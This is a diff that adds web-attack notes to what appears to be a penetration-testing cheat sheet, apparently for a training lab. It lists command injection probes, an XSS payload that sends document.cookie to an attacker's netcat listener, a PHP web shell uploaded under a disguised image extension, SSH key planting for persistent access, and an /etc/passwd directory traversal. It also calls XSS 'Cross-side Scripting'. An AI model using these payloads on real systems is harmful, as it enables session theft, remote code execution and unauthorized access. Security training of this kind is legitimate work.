@@ -61,10 +61,63 @@ lin-ops$ ssh -MS /tmp/t1  <t1 user>@127.0.0.1 -p <target local port>
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 WEB NOTES:
 
+- Cross-side Scripting (XSS)
+- Vulnerable input field:
+- You are looking for a text box that would have a command running behind it
+- ; whoami
+- ; pwd
+- ; ls -lisa /var/www/html/......
+- ; cat <filename>
 
+- JavaScriptTicket/Message field (NC listener/Cookie stealer):
+1 - Create the nc listener
+- lin-ops:~$ nc -lk <lin-ops ip> <RHP>
+- Its's important that both fields have information in them (name field and message field)
+2 - Now fill out the message/ticket fields:
+- Name can be anything
+- Message: <script>document.location="http://<lin-ops ip>:<RHP>/?username=" + document.cookie;</script>
 
+- Malicious Upload:
+- Server sees the .png and allows it as an acceptable uploads/
+- If a website has an Unrestricted File upload vulnerability, an attacker ca upload this script and trick the server into executing arbitrary commands directly on the host operating system
+1 - Create the html script (.php):
+- nano image.png.php
 
+<HTML><BODY>
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Send">
+</FORM>
+<pre>
+<?php
+if($_GET['cmd']) { system($_GET['cmd']); }
+?>
+</pre>
+</BODY></HTML>
 
+2 - On the public facing website, navigate to the file upload page
+
+3 - Upload the script and use the previously identified command injection point to verify the file location:
+- Path to test: ; ls /var/www/html/uploads
+
+4 - Navigate to the trigger URL to access the web shell interface
+- /uploads/image.png/php
+
+- SSH Keygen:
+1 - On lin-ops generate your ssh key:
+- ssh-keygen -t rsa -b 4096
+
+2 - Utilizing the vulnerable field or the web shell, create the necessary .ssh directory and file
+- mkdir /var/www/.ssh
+- touch /var/www/.ssh/authorized_keys
+- echo "<public_key_string>" >> /var/www/.ssh/authorized_keys
+ 
+3 - From lin-ops, connect to the target system via the established ssh key
+- ssh www-data@localhost -p 1234 (port in long ass tunnel command)
+
+- Directory Traversal
+- Within the URL:
+- /books_pick.php?book=../../../../../../etc/passwd
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 SQL NOTES:
 
